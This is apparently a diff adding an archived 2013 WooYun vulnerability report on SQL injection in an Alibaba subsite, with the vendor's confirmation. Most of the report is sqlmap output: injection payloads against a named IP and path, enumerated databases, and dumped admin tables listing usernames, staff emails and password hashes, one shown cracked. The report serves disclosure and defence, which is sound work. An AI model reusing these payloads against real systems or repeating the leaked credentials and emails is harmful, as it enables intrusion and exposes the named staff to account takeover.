@@ -1,0 +1,266 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		阿里巴巴某分站sql注入漏洞一枚  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		阿里巴巴某分站sql注入漏洞一枚  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/D＆G">D＆G</a> 
+</li><li>提交时间：		2013-09-11 10:18</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-09-11：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-09-11：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-09-21：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-10-01：	细节向普通白帽子公开<br/>
+									2013-10-11：	细节向实习白帽子公开<br/>
+									2013-10-26：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">sql注入。虽然不应该有这种问题，但是还是出现了。不过权限控制比较好。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">http://110.75.66.103/carnival/history/schedule/2013/detail/main/261<br />
+<br />
+</p><pre><code>Place: URI<br />
+Parameter: #1*<br />
+    Type: boolean-based blind<br />
+    Title: AND boolean-based blind - WHERE or HAVING clause<br />
+    Payload: http://110.75.66.103:80/carnival/history/schedule/2013/detail/main/261 AND 1667=1667<br />
+<br />
+    Type: UNION query<br />
+    Title: MySQL UNION query (NULL) - 10 columns<br />
+    Payload: http://110.75.66.103:80/carnival/history/schedule/2013/detail/main/261 UNION ALL SELECT NULL,NULL,CONCAT(0x3a6378623a,0x676a69624b6a4b634a6d,0x3a7879653a),NULL,NULL,NULL,NULL,NULL,NULL,NULL#<br />
+<br />
+    Type: stacked queries<br />
+    Title: MySQL &gt; 5.0.11 stacked queries<br />
+    Payload: http://110.75.66.103:80/carnival/history/schedule/2013/detail/main/261; SELECT SLEEP(5)--<br />
+<br />
+    Type: AND/OR time-based blind<br />
+    Title: MySQL &gt; 5.0.11 AND time-based blind<br />
+    Payload: http://110.75.66.103:80/carnival/history/schedule/2013/detail/main/261 AND SLEEP(5)<br />
+---<br />
+web application technology: Apache 2.2.22, PHP 5.3.14<br />
+back-end DBMS: MySQL 5.0.11</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><pre><code>web application technology: Apache 2.2.22, PHP 5.3.14<br />
+back-end DBMS: MySQL 5.0.11<br />
+banner:    &#039;5.1.61-Alibaba-121011-log&#039;</code></pre><p class='detail'><br />
+<br />
+对数据稍微分析了下，想看看能不能深入，结果本人小菜。。<br />
+<br />
+</p><pre><code>[*] adc<br />
+[*] devclub<br />
+[*] information_schema<br />
+[*] mysql<br />
+[*] tdc</code></pre><p class='detail'><br />
+<br />
+</p><pre><code>database management system users [1]:<br />
+[*] &#039;adc_admin&#039;@&#039;%&#039;</code></pre><p class='detail'><br />
+<br />
+虽然有多个库。目测应该是用的同一个数据库帐号。对mysql库，只有几个性能相关的表有权限。虽然@%，但是必然只开80端口，外联貌似没什么希望。<br />
+<br />
+3个库，应该是对应3个网站。devclub这个库分析了下：采用的是dilicms。猜测是一个叫淘宝技术沙龙的网站，不过现在devloperclub.taobao.com这个域名不用了。改叫阿里技术沙龙了。看来是废弃的了。<br />
+<br />
+</p><pre><code>Database: devclub<br />
+Table: dili_admins<br />
+[1 entry]<br />
++-----+------+--------------+----------+-------------------------------------------+<br />
+| uid | role | email        | username | password                                  |<br />
++-----+------+--------------+----------+-------------------------------------------+<br />
+| 1   | 1    | dili@cms.com | admin    | e10adc3949ba59abbe56e057f20f883e (123456) |<br />
++-----+------+--------------+----------+-------------------------------------------+</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+剩下的两个库，看名字adc，tdc，库的结构比比较相似。<br />
+<br />
+</p><pre><code>Database: adc<br />
+Table: admin<br />
+[7 entries]<br />
++----+------+-------+---------------+------------------+----------------------------------+-----------+<br />
+| id | salt | roles | email         | username         | password                         | is_active |<br />
++----+------+-------+---------------+------------------+----------------------------------+-----------+<br />
+| 1  | NULL | 1     | we3ew@163.com | we3ew            | 4a9b98e23425dbb1869d53d22d204c6b | 0         |<br />
+| 2  | NULL | 1     | &lt;blank&gt;       | ali_admin        | 613ed8ed6425fc58648a00bcccbc5c78 | 0         |<br />
+| 3  | NULL | 3     | &lt;blank&gt;       | d2_admin         | c8facf28afca351e2d9be95a67be75c7 | 0         |<br />
+| 4  | NULL | 3     | &lt;blank&gt;       | tcon_admin       | 83e5606fff5bfcba0be141bf7592b7f1 | 0         |<br />
+| 5  | NULL | 3     | &lt;blank&gt;       | iconference_admi | 6e59a80b7f718aa3cbae34dc4d3c3321 | 0         |<br />
+| 6  | NULL | 3     | &lt;blank&gt;       | idataforum_admin | ea5e7362db436c30411a1a3353b3a728 | 0         |<br />
+| 7  | NULL | 3     | &lt;blank&gt;       | act_admin        | f43ea5b5042d09687c29ff7a428d705b | 0         |<br />
++----+------+-------+---------------+------------------+----------------------------------+-----------+</code></pre><p class='detail'><br />
+<br />
+</p><pre><code>Database: adc<br />
+Table: auth_user<br />
+[4 entries]<br />
++----+----------------------+-----------+----------+-----------------------------------------------------+-----------+-----------+------------+---------------------+---------------------+--------------+<br />
+| id | email                | username  | is_staff | password                                            | last_name | is_active | first_name | last_login          | date_joined         | is_superuser |<br />
++----+----------------------+-----------+----------+-----------------------------------------------------+-----------+-----------+------------+---------------------+---------------------+--------------+<br />
+| 1  | luqi@taobao.com      | luqi      | 1        | sha1$eff86$c48f691deffc2eca07865202fb786bc197e20ad6 | &lt;blank&gt;   | 1         | &lt;blank&gt;    | 2012-06-05 19:49:00 | 2011-06-14 11:40:03 | 1            |<br />
+| 2  | &lt;blank&gt;              | shenhe    | 1        | sha1$f625e$fc4a062615a2836990a9609f8237c37fd56c1d01 | &lt;blank&gt;   | 1         | &lt;blank&gt;    | 2012-04-10 18:11:59 | 2011-06-16 19:08:59 | 0            |<br />
+| 3  | suqian.yf@taobao.com | suqian.yf | 1        | sha1$0150f$e714a969d6ae99a253d4e6f926dcf35cadab498e | &lt;blank&gt;   | 1         | &lt;blank&gt;    | 2011-08-19 12:16:34 | 2011-08-18 20:38:08 | 1            |<br />
+| 4  | &lt;blank&gt;              | qigong    | 1        | sha1$721fd$ef2255ea8a9f56d775f10ea6020d4f6b150661c9 | &lt;blank&gt;   | 1         | &lt;blank&gt;    | 2012-03-20 10:59:17 | 2011-08-19 12:13:44 | 0            |<br />
++----+----------------------+-----------+----------+-----------------------------------------------------+-----------+-----------+-------</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+sha1加密。加盐。有一个cmd5就可以直接查到。<br />
+<br />
+读取文件失败，貌似没有文件权限，这个比较好。这次的危害就可以控制在一些数据信息泄漏的层面。没有找到后台，测试么，就不爆破了。不过思路还有一些，毕竟可以控制数据库了。大牛应该还能玩点花样出来。<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><pre><code>Database: adc<br />
+Table: auth_user<br />
+[4 entries]<br />
++----+----------------------+-----------+----------+-----------------------------------------------------+-----------+-----------+------------+---------------------+---------------------+--------------+<br />
+| id | email                | username  | is_staff | password                                            | last_name | is_active | first_name | last_login          | date_joined         | is_superuser |<br />
++----+----------------------+-----------+----------+-----------------------------------------------------+-----------+-----------+------------+---------------------+---------------------+--------------+<br />
+| 1  | luqi@taobao.com      | luqi      | 1        | sha1$eff86$c48f691deffc2eca07865202fb786bc197e20ad6 | &lt;blank&gt;   | 1         | &lt;blank&gt;    | 2012-06-05 19:49:00 | 2011-06-14 11:40:03 | 1            |<br />
+| 2  | &lt;blank&gt;              | shenhe    | 1        | sha1$f625e$fc4a062615a2836990a9609f8237c37fd56c1d01 | &lt;blank&gt;   | 1         | &lt;blank&gt;    | 2012-04-10 18:11:59 | 2011-06-16 19:08:59 | 0            |<br />
+| 3  | suqian.yf@taobao.com | suqian.yf | 1        | sha1$0150f$e714a969d6ae99a253d4e6f926dcf35cadab498e | &lt;blank&gt;   | 1         | &lt;blank&gt;    | 2011-08-19 12:16:34 | 2011-08-18 20:38:08 | 1            |<br />
+| 4  | &lt;blank&gt;              | qigong    | 1        | sha1$721fd$ef2255ea8a9f56d775f10ea6020d4f6b150661c9 | &lt;blank&gt;   | 1         | &lt;blank&gt;    | 2012-03-20 10:59:17 | 2011-08-19 12:13:44 | 0            |<br />
++----+----------------------+-----------+----------+-----------------------------------------------------+-----------+-----------+-------</code></pre><p class='detail'> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">不班门弄斧了。泄漏的密码要改掉。乌云是不打码的。。。也是渗透测试时候的一个信息来源。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/D＆G" title="D＆G">D＆G</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-036749" title="阿里巴巴某分站sql注入漏洞一枚">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：8 </p>
+													<p class="detail">确认时间：2013-09-11 14:19</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢你对我们的支持与关注，该问题我们正在修复~~ 谢谢~</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="36749";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
